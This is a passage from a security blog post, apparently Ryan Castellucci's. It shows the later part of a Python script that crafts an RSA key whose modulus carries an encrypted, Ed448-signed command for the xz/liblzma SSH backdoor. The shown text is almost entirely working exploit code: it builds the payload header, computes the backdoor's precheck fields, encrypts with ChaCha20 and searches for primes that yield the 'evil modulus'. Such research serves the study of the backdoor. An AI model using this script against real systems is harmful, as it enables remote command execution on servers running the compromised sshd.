<span class="pgcssn">p</span><span class="pgcssp">,</span> <span class="pgcssn">q</span> <span class="pgcsso">=</span> <span class="pgcssnb">map</span><span class="pgcssp">(</span><span class="pgcssnb">int</span><span class="pgcssp">,</span> <span class="pgcssp">(</span><span class="pgcssn">n</span><span class="pgcssp">,</span> <span class="pgcssn">e</span><span class="pgcssp">,</span> <span class="pgcssn">d</span><span class="pgcssp">,</span> <span class="pgcssn">p</span><span class="pgcssp">,</span> <span class="pgcssn">q</span><span class="pgcssp">))</span></code></td></tr><tr><td class="linenos">63</td><td><code>    <span class="pgcssn">pub_params</span> <span class="pgcsso">=</span> <span class="pgcssn">RSAPublicNumbers</span><span class="pgcssp">(</span><span class="pgcssn">e</span><span class="pgcssp">,</span> <span class="pgcssn">n</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">64</td><td><code>    <span class="pgcssn">prv_params</span> <span class="pgcsso">=</span> <span class="pgcssn">RSAPrivateNumbers</span><span class="pgcssp">(</span><span class="pgcssn">p</span><span class="pgcssp">,</span> <span class="pgcssn">q</span><span class="pgcssp">,</span> <span class="pgcssn">d</span><span class="pgcssp">,</span> <span class="pgcssn">dmp1</span><span class="pgcssp">,</span> <span class="pgcssn">dmq1</span><span class="pgcssp">,</span> <span class="pgcssn">iqmp</span><span class="pgcssp">,</span> <span class="pgcssn">pub_params</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">65</td><td><code>    <span class="pgcssk">return</span> <span class="pgcssn">prv_params</span><span class="pgcsso">.</span><span class="pgcssn">private_key</span><span class="pgcssp">()</span></code></td></tr><tr><td class="linenos">66</td><td></td></tr><tr><td class="linenos">67</td><td><code><span class="pgcssc1"># pem format unencrypted private key</span></code></td></tr><tr><td class="linenos">68</td><td><code><span class="pgcssk">def</span> <span class="pgcssnf">pem_private</span><span class="pgcssp">(</span><span class="pgcssn">k</span><span class="pgcssp">):</span></code></td></tr><tr><td class="linenos">69</td><td><code>    <span class="pgcssk">return</span> <span class="pgcssn">k</span><span class="pgcsso">.</span><span class="pgcssn">private_bytes</span><span class="pgcssp">(</span></code></td></tr><tr><td class="linenos">70</td><td><code>        <span class="pgcssn">Encoding</span><span class="pgcsso">.</span><span class="pgcssn">PEM</span><span class="pgcssp">,</span> <span class="pgcssn">PrivateFormat</span><span class="pgcsso">.</span><span class="pgcssn">TraditionalOpenSSL</span><span class="pgcssp">,</span> <span class="pgcssn">NoEncryption</span><span class="pgcssp">()</span></code></td></tr><tr><td class="linenos">71</td><td><code>    <span class="pgcssp">)</span><span class="pgcsso">.</span><span class="pgcssn">decode</span><span class="pgcssp">()</span><span class="pgcsso">.</span><span class="pgcssn">strip</span><span class="pgcssp">()</span></code></td></tr><tr><td class="linenos">72</td><td></td></tr><tr><td class="linenos">73</td><td><code><span class="pgcssc1"># generate key in the same way <a href="https://github.com/amlweems/xzbot" rel="nofollow">https://github.com/amlweems/xzbot</a> does</span></code></td></tr><tr><td class="linenos">74</td><td><code><span class="pgcssk">def</span> <span class="pgcssnf">ed448_from_n</span><span class="pgcssp">(</span><span class="pgcssn">n</span><span class="pgcssp">):</span></code></td></tr><tr><td class="linenos">75</td><td><code>    <span class="pgcssn">seed</span> <span class="pgcsso">=</span> <span class="pgcssn">n</span><span class="pgcsso">.</span><span class="pgcssn">to_bytes</span><span class="pgcssp">(</span><span class="pgcssmi">57</span><span class="pgcssp">,</span> <span class="pgcssn">byteorder</span><span class="pgcsso">=</span><span class="pgcsss1">'big'</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">76</td><td><code>    <span class="pgcssk">return</span> <span class="pgcssn">Ed448PrivateKey</span><span class="pgcsso">.</span><span class="pgcssn">from_private_bytes</span><span class="pgcssp">(</span><span class="pgcssn">seed</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">77</td><td></td></tr><tr><td class="linenos">78</td><td><code><span class="pgcssc1"># encrypt/decrypt with raw ChaCha20</span></code></td></tr><tr><td class="linenos">79</td><td><code><span class="pgcssk">def</span> <span class="pgcssnf">chacha20</span><span class="pgcssp">(</span><span class="pgcssn">data</span><span class="pgcssp">,</span> <span class="pgcssn">key</span><span class="pgcssp">,</span> <span class="pgcssn">nonce</span><span class="pgcssp">):</span></code></td></tr><tr><td class="linenos">80</td><td><code>    <span class="pgcssn">cipher</span> <span class="pgcsso">=</span> <span class="pgcssn">Cipher</span><span class="pgcssp">(</span><span class="pgcssn">ChaCha20</span><span class="pgcssp">(</span><span class="pgcssn">key</span><span class="pgcssp">,</span> <span class="pgcssn">nonce</span><span class="pgcssp">),</span> <span class="pgcssn">mode</span><span class="pgcsso">=</span><span class="pgcsskc">None</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">81</td><td><code>    <span class="pgcssn">cryptor</span> <span class="pgcsso">=</span> <span class="pgcssn">cipher</span><span class="pgcsso">.</span><span class="pgcssn">encryptor</span><span class="pgcssp">()</span></code></td></tr><tr><td class="linenos">82</td><td><code>    <span class="pgcssk">return</span> <span class="pgcssn">cryptor</span><span class="pgcsso">.</span><span class="pgcssn">update</span><span class="pgcssp">(</span><span class="pgcssn">data</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">83</td><td></td></tr><tr><td class="linenos">84</td><td><code><span class="pgcssc1"># process server private key</span></code></td></tr><tr><td class="linenos">85</td><td><code><span class="pgcssn">srv_pub_type</span> <span class="pgcsso">=</span> <span class="pgcssn">argv</span><span class="pgcssp">[</span><span class="pgcssmi">1</span><span class="pgcssp">]</span><span class="pgcsso">.</span><span class="pgcssn">encode</span><span class="pgcssp">()</span></code></td></tr><tr><td class="linenos">86</td><td><code><span class="pgcssn">srv_pub_type</span> <span class="pgcsso">=</span> <span class="pgcssnb">len</span><span class="pgcssp">(</span><span class="pgcssn">srv_pub_type</span><span class="pgcssp">)</span><span class="pgcsso">.</span><span class="pgcssn">to_bytes</span><span class="pgcssp">(</span><span class="pgcssmi">4</span><span class="pgcssp">,</span> <span class="pgcsss1">'big'</span><span class="pgcssp">)</span> <span class="pgcsso">+</span> <span class="pgcssn">srv_pub_type</span></code></td></tr><tr><td class="linenos">87</td><td><code><span class="pgcssn">srv_pub_body</span> <span class="pgcsso">=</span> <span class="pgcssn">b64d</span><span class="pgcssp">(</span><span class="pgcssn">argv</span><span class="pgcssp">[</span><span class="pgcssmi">2</span><span class="pgcssp">])</span></code></td></tr><tr><td class="linenos">88</td><td><code><span class="pgcssn">srv_pub_hash</span> <span class="pgcsso">=</span> <span class="pgcssn">sha256</span><span class="pgcssp">(</span><span class="pgcssn">srv_pub_type</span> <span class="pgcsso">+</span> <span class="pgcssn">srv_pub_body</span><span class="pgcssp">)</span><span class="pgcsso">.</span><span class="pgcssn">digest</span><span class="pgcssp">()</span></code></td></tr><tr><td class="linenos">89</td><td></td></tr><tr><td class="linenos">90</td><td><code><span class="pgcssc1"># generate backdoor key</span></code></td></tr><tr><td class="linenos">91</td><td><code><span class="pgcssn">prv_key</span> <span class="pgcsso">=</span> <span class="pgcssn">ed448_from_n</span><span class="pgcssp">(</span><span class="pgcssnb">int</span><span class="pgcssp">(</span><span class="pgcssn">argv</span><span class="pgcssp">[</span><span class="pgcssmi">3</span><span class="pgcssp">]))</span></code></td></tr><tr><td class="linenos">92</td><td><code><span class="pgcssn">pub_key</span> <span class="pgcsso">=</span> <span class="pgcssn">prv_key</span><span class="pgcsso">.</span><span class="pgcssn">public_key</span><span class="pgcssp">()</span><span class="pgcsso">.</span><span class="pgcssn">public_bytes</span><span class="pgcssp">(</span><span class="pgcssn">Encoding</span><span class="pgcsso">.</span><span class="pgcssn">Raw</span><span class="pgcssp">,</span> <span class="pgcssn">PublicFormat</span><span class="pgcsso">.</span><span class="pgcssn">Raw</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">93</td><td><code><span class="pgcssn">sym_key</span> <span class="pgcsso">=</span> <span class="pgcssn">pub_key</span><span class="pgcssp">[</span><span class="pgcssmi">0</span><span class="pgcssp">:</span><span class="pgcssmi">32</span><span class="pgcssp">]</span></code></td></tr><tr><td class="linenos">94</td><td></td></tr><tr><td class="linenos">95</td><td><code><span class="pgcssc1"># command is null terminated</span></code></td></tr><tr><td class="linenos">96</td><td><code><span class="pgcssn">command</span> <span class="pgcsso">=</span> <span class="pgcssn">argv</span><span class="pgcssp">[</span><span class="pgcssmi">4</span><span class="pgcssp">]</span><span class="pgcsso">.</span><span class="pgcssn">encode</span><span class="pgcssp">()</span> <span class="pgcsso">+</span> <span class="pgcsssa">b</span><span class="pgcsss1">'</span><span class="pgcssse">\0</span><span class="pgcsss1">'</span></code></td></tr><tr><td class="linenos">97</td><td><code><span class="pgcssk">if</span> <span class="pgcssnb">len</span><span class="pgcssp">(</span><span class="pgcssn">command</span><span class="pgcssp">)</span> <span class="pgcsso">></span> <span class="pgcssmi">64</span><span class="pgcssp">:</span></code></td></tr><tr><td class="linenos">98</td><td><code>    <span class="pgcssnb">print</span><span class="pgcssp">(</span><span class="pgcsss1">'command too long, should not exceed 64 characters'</span><span class="pgcssp">,</span> <span class="pgcssn">file</span><span class="pgcsso">=</span><span class="pgcssn">stderr</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">99</td><td><code>    <span class="pgcssn">exit</span><span class="pgcssp">(</span><span class="pgcssmi">1</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">100</td><td></td></tr><tr><td class="linenos">101</td><td><code><span class="pgcssc1"># command needs to be at least five bytes for signing, pad as required</span></code></td></tr><tr><td class="linenos">102</td><td><code><span class="pgcssk">while</span> <span class="pgcssnb">len</span><span class="pgcssp">(</span><span class="pgcssn">command</span><span class="pgcssp">)</span> <span class="pgcsso"><</span> <span class="pgcssmi">5</span><span class="pgcssp">:</span> <span class="pgcssn">command</span> <span class="pgcsso">+=</span> <span class="pgcsssa">b</span><span class="pgcsss1">'</span><span class="pgcssse">\0</span><span class="pgcsss1">'</span></code></td></tr><tr><td class="linenos">103</td><td></td></tr><tr><td class="linenos">104</td><td><code><span class="pgcssc1"># the first few bytes of an rsa modulus probably aren't uniformly distributed,</span></code></td></tr><tr><td class="linenos">105</td><td><code><span class="pgcssc1"># so start off with an N value from a normally generated key</span></code></td></tr><tr><td class="linenos">106</td><td><code><span class="pgcssn">rsa</span> <span class="pgcsso">=</span> <span class="pgcssn">rsa_generate</span><span class="pgcssp">(</span><span class="pgcssnb">int</span><span class="pgcssp">(</span><span class="pgcssn">RSA_E</span><span class="pgcssp">),</span> <span class="pgcssn">RSA_BITS</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">107</td><td><code><span class="pgcssn">n</span> <span class="pgcsso">=</span> <span class="pgcssn">rsa</span><span class="pgcsso">.</span><span class="pgcssn">private_numbers</span><span class="pgcssp">()</span><span class="pgcsso">.</span><span class="pgcssn">public_numbers</span><span class="pgcsso">.</span><span class="pgcssn">n</span></code></td></tr><tr><td class="linenos">108</td><td><code><span class="pgcssn">n_bytes</span> <span class="pgcsso">=</span> <span class="pgcssn">int_to_bytearray</span><span class="pgcssp">(</span><span class="pgcssn">n</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">109</td><td></td></tr><tr><td class="linenos">110</td><td><code><span class="pgcssc1"># xz backdoor precheck fields</span></code></td></tr><tr><td class="linenos">111</td><td><code><span class="pgcssn">cmd1</span><span class="pgcssp">,</span> <span class="pgcssn">cmd2</span> <span class="pgcsso">=</span> <span class="pgcssn">unpack_from</span><span class="pgcssp">(</span><span class="pgcsss1">'<ll&#x27;&lt; span><span class="pgcssp">,</span> <span class="pgcssn">n_bytes</span><span class="pgcssp">,</span> <span class="pgcssmi">0</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">112</td><td><code><span class="pgcssn">cmd3</span> <span class="pgcsso">=</span> <span class="pgcssp">((</span><span class="pgcssmi">2</span><span class="pgcsso">**</span><span class="pgcssmi">64</span> <span class="pgcsso">+</span> <span class="pgcssn">COMMAND</span><span class="pgcssp">)</span> <span class="pgcsso">-</span> <span class="pgcssn">cmd1</span> <span class="pgcsso">*</span> <span class="pgcssn">cmd2</span><span class="pgcssp">)</span> <span class="pgcsso">%</span> <span class="pgcssmi">2</span><span class="pgcsso">**</span><span class="pgcssmi">64</span></code></td></tr><tr><td class="linenos">113</td><td><code><span class="pgcssn">pack_into</span><span class="pgcssp">(</span><span class="pgcsss1">'<q&#x27;&lt; span><span class="pgcssp">,</span> <span class="pgcssn">n_bytes</span><span class="pgcssp">,</span> <span class="pgcssmi">8</span><span class="pgcssp">,</span> <span class="pgcssn">cmd3</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">114</td><td></td></tr><tr><td class="linenos">115</td><td><code><span class="pgcssc1"># build payload</span></code></td></tr><tr><td class="linenos">116</td><td><code><span class="pgcssn">hdr_magic</span> <span class="pgcsso">=</span> <span class="pgcsssa">b</span><span class="pgcsss1">'</span><span class="pgcssse">\2\0\0\0</span><span class="pgcsss1">'</span></code></td></tr><tr><td class="linenos">117</td><td><code><span class="pgcssn">hdr_flags</span> <span class="pgcsso">=</span> <span class="pgcsssa">b</span><span class="pgcsss1">'</span><span class="pgcssse">\0\0\0\0</span><span class="pgcsss1">'</span></code></td></tr><tr><td class="linenos">118</td><td><code><span class="pgcssn">hdr_ukwn1</span> <span class="pgcsso">=</span> <span class="pgcsssa">b</span><span class="pgcsss1">'</span><span class="pgcssse">\0</span><span class="pgcsss1">'</span></code></td></tr><tr><td class="linenos">119</td><td><code><span class="pgcssn">hdr_cslen</span> <span class="pgcsso">=</span> <span class="pgcssnb">bytes</span><span class="pgcssp">([</span><span class="pgcssnb">len</span><span class="pgcssp">(</span><span class="pgcssn">command</span><span class="pgcssp">)])</span></code></td></tr><tr><td class="linenos">120</td><td><code><span class="pgcssn">hdr_ukwn2</span> <span class="pgcsso">=</span> <span class="pgcsssa">b</span><span class="pgcsss1">'</span><span class="pgcssse">\0</span><span class="pgcsss1">'</span></code></td></tr><tr><td class="linenos">121</td><td><code><span class="pgcssn">header</span> <span class="pgcsso">=</span> <span class="pgcssn">hdr_magic</span> <span class="pgcsso">+</span> <span class="pgcssn">hdr_flags</span> <span class="pgcsso">+</span> <span class="pgcssn">hdr_ukwn1</span> <span class="pgcsso">+</span> <span class="pgcssn">hdr_cslen</span> <span class="pgcsso">+</span> <span class="pgcssn">hdr_ukwn2</span></code></td></tr><tr><td class="linenos">122</td><td><code><span class="pgcssn">to_sign</span> <span class="pgcsso">=</span> <span class="pgcssnb">bytes</span><span class="pgcssp">(</span><span class="pgcssn">header</span> <span class="pgcsso">+</span> <span class="pgcssn">command</span> <span class="pgcsso">+</span> <span class="pgcssn">srv_pub_hash</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">123</td><td><code><span class="pgcssn">signature</span> <span class="pgcsso">=</span> <span class="pgcssn">prv_key</span><span class="pgcsso">.</span><span class="pgcssn">sign</span><span class="pgcssp">(</span><span class="pgcssn">to_sign</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">124</td><td><code><span class="pgcssn">plaintext</span> <span class="pgcsso">=</span> <span class="pgcssn">signature</span> <span class="pgcsso">+</span> <span class="pgcssn">command</span></code></td></tr><tr><td class="linenos">125</td><td><code><span class="pgcssn">ciphertext</span> <span class="pgcsso">=</span> <span class="pgcssn">chacha20</span><span class="pgcssp">(</span><span class="pgcssn">plaintext</span><span class="pgcssp">,</span> <span class="pgcssn">sym_key</span><span class="pgcssp">,</span> <span class="pgcssn">n_bytes</span><span class="pgcssp">[:</span><span class="pgcssmi">16</span><span class="pgcssp">])</span></code></td></tr><tr><td class="linenos">126</td><td></td></tr><tr><td class="linenos">127</td><td><code><span class="pgcssc1"># splice the payload into the modulus</span></code></td></tr><tr><td class="linenos">128</td><td><code><span class="pgcssn">n_bytes</span> <span class="pgcsso">=</span> <span class="pgcssn">replace_at</span><span class="pgcssp">(</span><span class="pgcssn">n_bytes</span><span class="pgcssp">,</span> <span class="pgcssn">ciphertext</span><span class="pgcssp">,</span> <span class="pgcssmi">16</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">129</td><td><code><span class="pgcssn">n</span> <span class="pgcsso">=</span> <span class="pgcssn">mpz_from_bytes</span><span class="pgcssp">(</span><span class="pgcssn">n_bytes</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">130</td><td></td></tr><tr><td class="linenos">131</td><td><code><span class="pgcssc1"># We'll choose a new prime `p` randomly, then divide the modulus to get a new</span></code></td></tr><tr><td class="linenos">132</td><td><code><span class="pgcssc1"># `q`. With this process the lowest bits of the modulus corrosponding to the</span></code></td></tr><tr><td class="linenos">133</td><td><code><span class="pgcssc1"># size (plus a few) of `p` get scrambled while the upper bits of the modulus</span></code></td></tr><tr><td class="linenos">134</td><td><code><span class="pgcssc1"># remain fixed. The size of `p` is chosen here such that our payload is kept.</span></code></td></tr><tr><td class="linenos">135</td><td><code><span class="pgcssc1"># <span class="fixme">NOTE</span>: The security level of the key scales down with the size of `p`.</span></code></td></tr><tr><td class="linenos">136</td><td><code><span class="pgcssn">p_bytes</span> <span class="pgcsso">=</span> <span class="pgcssnb">min</span><span class="pgcssp">((</span><span class="pgcssn">RSA_BITS</span> <span class="pgcsso">//</span> <span class="pgcssmi">8</span> <span class="pgcsso">-</span> <span class="pgcssmi">17</span><span class="pgcssp">)</span> <span class="pgcsso">-</span> <span class="pgcssnb">len</span><span class="pgcssp">(</span><span class="pgcssn">ciphertext</span><span class="pgcssp">),</span> <span class="pgcssn">RSA_BITS</span> <span class="pgcsso">//</span> <span class="pgcssmi">16</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">137</td><td></td></tr><tr><td class="linenos">138</td><td><code><span class="pgcssc1"># generate p, q to produce the evil modulus</span></code></td></tr><tr><td class="linenos">139</td><td><code><span class="pgcssn">tries</span> <span class="pgcsso">=</span> <span class="pgcssmi">0</span></code></td></tr><tr><td class="linenos">140</td><td><code><span class="pgcssk">while</span> <span class="pgcsskc">True</span><span class="pgcssp">:</span></code></td></tr><tr><td class="linenos">141</td><td><code>    <span class="pgcssn">p</span> <span class="pgcsso">=</span> <span class="pgcssn">random_prime</span><span class="pgcssp">(</span><span class="pgcssn">p_bytes</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">142</td><td><code>    <span class="pgcssn">q</span> <span class="pgcsso">=</span> <span class="pgcssn">next_prime</span><span class="pgcssp">(</span><span class="pgcssn">c_div</span><span class="pgcssp">(</span><span class="pgcssn">n</span><span class="pgcssp">,</span> <span class="pgcssn">p</span><span class="pgcssp">))</span></code></td></tr><tr><td class="linenos">143</td><td><code>    <span class="pgcssn">n_payload</span> <span class="pgcsso">=</span> <span class="pgcssn">p</span> <span class="pgcsso">*</span> <span class="pgcssn">q</span></code></td></tr><tr><td class="linenos">144</td><td><code>    <span class="pgcssn">n_payload_bytes</span> <span class="pgcsso">=</span> <span class="pgcssn">int_to_bytearray</span><span class="pgcssp">(</span><span class="pgcssn">n_payload</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">145</td><td></td></tr><tr><td class="linenos">146</td><td><code>    <span class="pgcssn">good</span> <span class="pgcsso">=</span> <span class="pgcssmi">0</span></code></td></tr><tr><td class="linenos">147</td><td><code>    <span class="pgcssk">for</span> <span class="pgcssn">i</span> <span class="pgcssow">in</span> <span class="pgcssnb">range</span><span class="pgcssp">(</span><span class="pgcssnb">len</span><span class="pgcssp">(</span><span class="pgcssn">ciphertext</span><span class="pgcssp">)):</span></code></td></tr><tr><td class="linenos">148</td><td><code>        <span class="pgcssk">if</span> <span class="pgcssn">n_payload_bytes</span><span class="pgcssp">[</span><span class="pgcssmi">16</span><span class="pgcsso">+</span><span class="pgcssn">i</span><span class="pgcssp">]</span> <span class="pgcsso">==</span> <span class="pgcssn">ciphertext</span><span class="pgcssp">[</span><span class="pgcssn">i</span><span class="pgcssp">]:</span> <span class="pgcssn">good</span> <span class="pgcsso">+=</span> <span class="pgcssmi">1</span></code></td></tr><tr><td class="linenos">149</td><td><code>        <span class="pgcssk">else</span><span class="pgcssp">:</span> <span class="pgcssk">break</span></code></td></tr><tr><td class="linenos">150</td><td></td></tr><tr><td class="linenos">151</td><td><code>    <span class="pgcssk">if</span> <span class="pgcssn">good</span> <span class="pgcsso">==</span> <span class="pgcssnb">len</span><span class="pgcssp">(</span><span class="pgcssn">ciphertext</span><span class="pgcssp">):</span></code></td></tr><tr><td class="linenos">152</td><td><code>        <span class="pgcssc1"># parameter validation</span></code></td></tr><tr><td class="linenos">153</td><td><code>        <span class="pgcssn">totient</span> <span class="pgcsso">=</span> <span class="pgcssn">lcm</span><span class="pgcssp">(</span><span class="pgcssn">p</span> <span class="pgcsso">-</span> <span class="pgcssmi">1</span><span class="pgcssp">,</span> <span class="pgcssn">q</span> <span class="pgcsso">-</span> <span class="pgcssmi">1</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">154</td><td><code>        <span class="pgcssk">if</span> <span class="pgcssn">gcd</span><span class="pgcssp">(</span><span class="pgcssn">totient</span><span class="pgcssp">,</span> <span class="pgcssn">RSA_E</span><span class="pgcssp">)</span> <span class="pgcsso">==</span> <span class="pgcssmi">1</span><span class="pgcssp">:</span></code></td></tr><tr><td class="linenos">155</td><td><code>            <span class="pgcssc1"># compute private exponent</span></code></td></tr><tr><td class="linenos">156</td><td><code>            <span class="pgcssn">d</span> <span class="pgcsso">=</span> <span class="pgcssn">invert</span><span class="pgcssp">(</span><span class="pgcssn">RSA_E</span><span class="pgcssp">,</span> <span class="pgcssn">totient</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">157</td><td></td></tr><tr><td class="linenos">158</td><td><code>            <span class="pgcssn">rsa</span> <span class="pgcsso">=</span> <span class="pgcssn">rsa_construct</span><span class="pgcssp">(</span><span class="pgcssn">n_payload</span><span class="pgcssp">,</span> <span class="pgcssn">RSA_E</span><span class="pgcssp">,</span> <span class="pgcssn">d</span><span class="pgcssp">,</span> <span class="pgcssn">p</span><span class="pgcssp">,</span> <span class="pgcssn">q</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">159</td><td><code>            <span class="pgcssk">break</span></code></td></tr><tr><td class="linenos">160</td><td></td></tr><tr><td class="linenos">161</td><td><code>    <span class="pgcssk">if</span> <span class="pgcssn">tries</span> <span class="pgcsso">:=</span> <span class="pgcssn">tries</span> <span class="pgcsso">+</span> <span class="pgcssmi">1</span> <span class="pgcsso">></span> <span class="pgcssmi">100</span><span class="pgcssp">:</span></code></td></tr><tr><td class="linenos">162</td><td><code>        <span class="pgcssnb">print</span><span class="pgcssp">(</span><span class="pgcsss1">'failed to generate key'</span><span class="pgcssp">,</span> <span class="pgcssn">file</span><span class="pgcsso">=</span><span class="pgcssn">stderr</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">163</td><td><code>        <span class="pgcssn">exit</span><span class="pgcssp">(</span><span class="pgcssmi">1</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">164</td><td></td></tr><tr><td class="linenos">165</td><td><code><span class="pgcssnb">print</span><span class="pgcssp">(</span><span class="pgcssn">pem_private</span><span class="pgcssp">(</span><span class="pgcssn">rsa</span><span class="pgcssp">))</span></code></td></tr></tbody></table></div><p>I describe a similar technique in detail in my <a class="external" href="/cert-tricks.html">Stupid Certificate Tricks</a> post, and also have an <a class="external" href="/ssh-vanity.html">SSH Vanity Key Generator</a> available to play with.</p></div><div class="call-to-action"> If you enjoyed this, please consider <a class="external" href="//www.crowdjustice.com/case/non-binary-recognition/pledge/?amount=50.00">donating</a> to help with <a class="external" href="//www.crowdjustice.com/case/non-binary-recognition/">my legal costs</a>. <br> Iâm suing the British government for legal recognition of the <a href="/gender.html">gender</a> listed on my birth certificate. </div><footer class="postmeta"><span itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="rya.nc"><span itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://rya.nc/4ad9410dcccb51f5/avatar3.png"></span></span> Posted by <a href="/author/ryanc.html" title="Posts by Ryan Castellucci" itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="url" content="https://rya.nc/"><span itemprop="name">Ryan Castellucci</span></a> on <time class="published" title="2024-04-03T17:55:00+01:00" datetime="2024-04-03T17:55:00+01:00" data-time="17:55:00+0100">2024-04-03</time><meta itemprop="datePublished" content="2024-04-03T17:55:00+01:00"> | Tags: <a href="/tag/rsa.html" rel="tag">rsa</a> <a href="/tag/ssh.html" rel="tag">ssh</a> <a href="/tag/exploit.html" rel="tag">exploit</a> <a href="/tag/security.html" rel="tag">security</a> <a href="/tag/cryptography.html" rel="tag">cryptography</a> <meta itemprop="dateModified" content="2024-04-03T17:55:00+01:00"></footer></div></section><footer id="contentinfo"><div id="ft_left"><p>Â©2024Â <a href="/about.html">Ryan Castellucci</a><span class="noprint"><br>Powered by <a href="https://getpelican.com/">Pelican</a> | <a href="/privacy.html">Privacy Policy</a></span></p></div><div id="ft_right"><p><a href="https://github.com/ryancdotorg/rya.nc-theme">Theme</a> based on <a href="http://www.theopensourcerer.com/this-theme/">Open Sourcerer</a> by Alan Lord / <a href="https://www.gnu.org/licenses/gpl-3.0.html">GPLv3</a><br>Header image from <a href="https://www.flickr.com/photos/profilerehab/4250721014/in/photostream/">this photo</a> by Andrew Taylor / <a href="https://creativecommons.org/licenses/by/2.0/">CC BY</a></p></div></footer></div><script src="/theme/js/7b0e530511f55530/etc.bundle.js" async></script><link rel="stylesheet" href="/theme/css/dbe1d4c42cdc98d0/print.css" media="print"></body></html>